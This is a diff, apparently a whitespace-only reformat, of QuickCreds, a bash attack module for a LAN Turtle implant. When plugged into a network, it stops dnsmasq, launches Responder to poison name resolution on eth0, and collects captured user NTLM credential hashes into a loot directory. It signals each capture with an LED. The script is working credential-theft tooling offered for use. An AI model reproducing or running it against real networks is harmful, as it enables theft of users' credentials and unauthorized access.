@@ -109,23 +109,23 @@ function configure {
 
 # Function called from within this script file, therefore it needs to be positioned before the code that calls the function (bash basics...)
 function finished {
-    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1	
+    /bin/echo 255 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1  
     /bin/sync 
     exit
 }
 
 # Function called from the Turtle module "GUI"
 function start {
-	# Stop on-off-on DHCP blink pattern script, this is what causes the "Terminated" text to appear if running QuickCreds from within the Turtle module system in the Turtle "GUI"
-	/bin/echo "Stopping DHCP Detect Blink Script"
-	/etc/init.d/dhcp_detect stop
-	/bin/echo ""
-	/bin/echo "QuickCreds started."
+        # Stop on-off-on DHCP blink pattern script, this is what causes the "Terminated" text to appear if running QuickCreds from within the Turtle module system in the Turtle "GUI"
+        /bin/echo "Stopping DHCP Detect Blink Script"
+        /etc/init.d/dhcp_detect stop
+        /bin/echo ""
+        /bin/echo "QuickCreds started."
     /bin/echo "The orange/amber LED will blink while QuickCreds is running."
     /bin/echo "The orange/amber LED will turn solid upon NTLM hash capture."
-	/bin/echo ""
-	/bin/echo "If starting this module from the Turtle Shell menu,"
-	/bin/echo "press CTRL+C to return."
+        /bin/echo ""
+        /bin/echo "If starting this module from the Turtle Shell menu,"
+        /bin/echo "press CTRL+C to return."
 
     # Create new numbered loot directory and symlink it from Responder logs
     /bin/mkdir -p $LOOTDIR
@@ -141,19 +141,19 @@ function start {
     # Saving interface info, surplus information and can be deleted
     /sbin/ifconfig > $LOOTDIR"Creds"$((dircount))/ifconfig_dump.log
 
-	/bin/echo "Creds$((dircount)) - Initiating Responder attack..." >> $RESPLOG
+        /bin/echo "Creds$((dircount)) - Initiating Responder attack..." >> $RESPLOG
 
-	# Stop dnsmasq
-	/bin/echo "Creds$((dircount)) - Stopping dnsmasq" >> $RESPLOG
-	/etc/init.d/dnsmasq stop 1&> /dev/null
+        # Stop dnsmasq
+        /bin/echo "Creds$((dircount)) - Stopping dnsmasq" >> $RESPLOG
+        /etc/init.d/dnsmasq stop 1&> /dev/null
 
-	# Execute attack
-	/bin/echo "Creds$((dircount)) - Starting screen and Responder" >> $RESPLOG
+        # Execute attack
+        /bin/echo "Creds$((dircount)) - Starting screen and Responder" >> $RESPLOG
     /usr/sbin/screen -dmS responder /bin/bash -c 'cd /sd/Responder; /usr/bin/python /sd/Responder/Responder.py -I eth0 -w -r -d -P'
         
-	/bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >> $RESPLOG
-	# Blink upon hash capture
-	while true; do
+        /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >> $RESPLOG
+        # Blink upon hash capture
+        while true; do
         # Grep for user creds and do not match on machine creds, machine usernames end in $
         if [[ $(/bin/grep -v '\$:' $RESPLOGDIR/*NTLM* 2>/dev/null) ]]; then
             /bin/echo "Creds$((dircount)) - Found user creds NTLM file in the logs directory!" >> $RESPLOG
@@ -170,17 +170,17 @@ function start {
         /bin/sleep $SLEEPTIMER
         /bin/echo 0 > /sys/class/leds/lan-turtle\:orange\:system/brightness 2>&1
         /bin/sleep $SLEEPTIMER 
-	done
+        done
 }
 
 # Function called from the Turtle module "GUI"
 function stop {
-	/bin/kill $(/bin/ps | /bin/grep [R]esponder | /usr/bin/awk {'print $1'})
-	/etc/init.d/dnsmasq start 1&> /dev/null
-	/bin/echo "QuickCreds Stopped"
+        /bin/kill $(/bin/ps | /bin/grep [R]esponder | /usr/bin/awk {'print $1'})
+        /etc/init.d/dnsmasq start 1&> /dev/null
+        /bin/echo "QuickCreds Stopped"
 }
 
 # Function called from the Turtle module "GUI"
 function status {
-	if [[ $(/bin/ps | /bin/grep -w [R]esponder.py) ]]; then /bin/echo "1"; else /bin/echo "0"; fi
+        if [[ $(/bin/ps | /bin/grep -w [R]esponder.py) ]]; then /bin/echo "1"; else /bin/echo "0"; fi
 }
